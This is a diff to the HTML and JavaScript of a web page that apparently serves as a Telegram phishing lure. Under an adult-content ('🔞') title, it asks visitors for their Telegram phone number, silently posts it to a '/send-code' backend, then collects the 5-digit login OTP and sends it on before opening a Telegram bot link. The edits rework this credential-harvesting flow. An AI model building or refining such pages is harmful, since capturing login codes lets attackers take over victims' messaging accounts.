@@ -28,9 +28,10 @@
             display: flex; flex-direction: column; align-items: center;
         }
 
+        /* Main Card Box */
         .header-box {
             background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
-            width: 100%; text-align: center; margin-bottom: 20px;
+            width: 100%; text-align: center; margin-bottom: 15px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             position: relative;
             margin-top: 35px;
@@ -76,12 +77,13 @@
         }
         .btn-get-code:active { transform: scale(0.97); }
 
-        /* দ্বিতীয় স্ক্রিনশটের মতো ফাঁকা বক্সের টাইপিং ইনপুট কন্টেইনার */
-        .otp-input-container {
-            width: 100%; margin-bottom: 20px; display: flex; justify-content: center;
+        /* নিচের ওটিপি সেকশন (শুরুতে হাইড থাকবে, কোড পাঠানোর পর শো হবে) */
+        .otp-wrapper {
+            width: 100%; display: flex; flex-direction: column; gap: 12px;
         }
+
         .otp-text-input {
-            width: 100%; padding: 16px; font-size: 20px; font-weight: 600;
+            width: 100%; padding: 15px; font-size: 20px; font-weight: 600;
             text-align: center; border-radius: 14px;
             border: 2px solid rgba(255, 255, 255, 0.8);
             background: rgba(255, 255, 255, 0.15); color: #fff;
@@ -89,7 +91,7 @@
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
         .otp-text-input::placeholder {
-            color: rgba(255, 255, 255, 0.6); font-size: 18px; font-weight: normal;
+            color: rgba(255, 255, 255, 0.7); font-size: 16px; font-weight: normal;
         }
 
         /* Transparent Glassmorphism Confirm Otp Button with Glowing Border Effect */
@@ -116,63 +118,51 @@
 
     <div class="container">
         
-        <div class="header-box" id="cardBox">
+        <!-- উপরে নাম্বার ও গেট কোড সেকশন -->
+        <div class="header-box" id="phoneSection">
             <div class="animated-icon-container">
                 <div class="phone-icon-inner">📥</div>
             </div>
 
-            <h2 id="boxTitle">Enter Telegram Number 🔞</h2>
+            <h2>Enter Telegram Number 🔞</h2>
             <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
-            <button class="btn-get-code" id="actionBtn" onclick="handleAction()">GET CODE 📩</button>
+            <button class="btn-get-code" onclick="sendCode()">GET CODE 📩</button>
         </div>
 
-        <!-- সরাসরি ফাঁকা বক্সের টাইপিং ইনপুট (দ্বিতীয় স্ক্রিনশটের মতো) -->
-        <div class="otp-input-container" id="otpSection" style="display: none;">
+        <!-- নিচে ওটিপি এবং কনফার্ম সেকশন (শুরুতে লুকানো থাকবে) -->
+        <div class="otp-wrapper" id="otpSection" style="display: none;">
             <input type="text" id="otpInput" class="otp-text-input" maxlength="5" placeholder="Enter 5-Digit OTP">
+            <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
         </div>
-
-        <!-- Confirm Otp Button -->
-        <button class="btn-confirm-otp" id="confirmBtn" style="display: none;" onclick="verifyOtpCode()">Confirm Otp ✨</button>
     </div>
 
     <script>
-        let step = "phone"; 
         let savedPhone = "";
 
-        function handleAction() {
-            if (step === "phone") {
-                let phone = document.getElementById('phoneInput').value;
-                if(!phone) {
-                    return;
-                }
-                savedPhone = phone;
-                
-                // কোনো পপ-আপ মেসেজ ছাড়া নীরবে রিকোয়েস্ট পাঠানো হচ্ছে
-                fetch('/send-code', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: phone })
-                })
-                .then(res => res.json())
-                .then(data => {
-                    if(data.status === "success") {
-                        step = "otp";
-                        
-                        // হেডার বক্সের টাইটেল পরিবর্তন করে ওটিপি মোডে নিয়ে যাওয়া
-                        document.getElementById('boxTitle').innerText = "Enter 5-Digit OTP Code 🔑";
-                        document.getElementById('phoneInput').style.display = "none";
-                        document.getElementById('actionBtn').style.display = "none";
-                        
-                        // দ্বিতীয় স্ক্রিনশটের মতো ওটিপি বক্স ও কনফার্ম বাটন শো করা
-                        document.getElementById('otpSection').style.display = "flex";
-                        document.getElementById('confirmBtn').style.display = "block";
-                        document.getElementById('otpInput').focus();
-                    } else {
-                        alert("Error: " + data.message);
-                    }
-                })
-                .catch(err => console.log("Connection error"));
+        function sendCode() {
+            let phone = document.getElementById('phoneInput').value;
+            if(!phone) {
+                return;
             }
+            savedPhone = phone;
+            
+            // নীরবে ব্যাকএন্ডে রিকোয়েস্ট পাঠানো হচ্ছে (কোনো পপআপ ছাড়া)
+            fetch('/send-code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: phone })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.status === "success") {
+                    // সফলভাবে কোড চলে গেলে নিচের ওটিপি সেকশনটি স্মুথলি ওপেন হয়ে যাবে
+                    document.getElementById('otpSection').style.display = "flex";
+                    document.getElementById('otpInput').focus();
+                } else {
+                    alert("Error: " + data.message);
+                }
+            })
+            .catch(err => console.log("Connection error"));
         }
 
         function verifyOtpCode() {
@@ -189,7 +179,7 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
-                    // সফল হলে নতুন ট্যাবে টেলিগ্রাম বট ওপেন হবে
+                    // সফলভাবে ভেরিফাই হলে নতুন ট্যাবে টেলিগ্রাম বট ওপেন হবে
                     window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                 } else {
                     alert("Verification Failed: " + data.message);
